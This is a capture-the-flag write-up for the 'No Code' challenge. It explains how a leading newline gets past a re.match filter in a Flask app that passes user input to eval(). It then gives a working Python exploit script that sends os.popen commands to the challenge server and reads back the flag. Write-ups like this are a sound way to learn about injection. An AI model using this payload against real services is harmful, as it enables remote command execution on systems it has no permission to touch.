# No Code

I made a web app that lets you run any code you want. Just kidding!

Author: SteakEnthusiast

`export URL=https://uoftctf-no-code.chals.io`

```
# app.py
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code', '')
    if re.match(".*[\x20-\x7E]+.*", code):
        return jsonify({"output": "jk lmao no code"}), 403
    result = ""
    try:
        result = eval(code)
    except Exception as e:
        result = str(e)

    return jsonify({"output": result}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)
```

## Initial thoughts

We have a route that we can POST some 'code' data to.

Testing the route with curl:
`curl $URL/execute -d "code=hello"`
we get
`{"output":"jk lmao no code"}`

Now, we know that this is because of the re.match() check.

Now, I want to try and understand how to bypass the regex check so we can reach the eval() statement.

## Breaking down the regex

`if re.match(".*[\x20-\x7E]+.*", code):`

> re.match(pattern, string, flags=0)
>
> If zero or more characters at the beginning of string match the regular expression pattern, return a corresponding Match. Return None if the string does not match the pattern; note that this is different from a zero-length match.

`".*[\x20-\x7E]+.*"`

- `.` can match any single character
- `*` can match zero or more characters
- `[\x20-x7E]+` can match characters with ascii value of 20(space) to 126(~) and with the plus it will match one or more

In my understanding, to make the re.match() not evaluate to true we need to find a string that the beginning doesnt match the regex.

Then, I remember this line in the re.match() docs.

> Note that even in MULTILINE mode, re.match() will only match at the beginning of the string and not at the beginning of each line.

Simply adding a `\n` in the start of the code will let us bypass the if check.

## Figuring out the payload

My initial thought here is to establish a rev shell. HOW DO I DO THAT THOUGH?

After spending some time trying to get a reverse shell, messing with revshells.com... I kept getting some `error 32512` or `error 256` with os.system() and `syntax error: bad fd number`.

So, after doing some more research how to exploit a python code injection I came upon this [article](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html).

Using os.popen('command').read() would let us get the return values of the command we run compared to using os.system() where we could only get the return code.

So, I crafted this script...

```
#!/usr/bin/python3

import requests

url = "https://uoftctf-no-code.chals.io"

command = 'command'
wrapper = f"__import__('os').popen('{command}').read()"

payload = {"code" : "\n" + wrapper}

r = requests.post(url+"/execute", payload)

print(r.text)
```

Running the script with `ls`, we get this `{"output":"app.py\nflag.txt\nrequirements.txt\n"}`.

So, now we just need to cat the flag.txt with `cat flag.txt` and we get `{"output":"uoftctf{r3g3x_3p1c_f41L_XDDD}"}`

FLAG: uoftctf{r3g3x_3p1c_f41L_XDDD}

P.S: I might have gotten the flag but I was not able to establish a reverse shell.
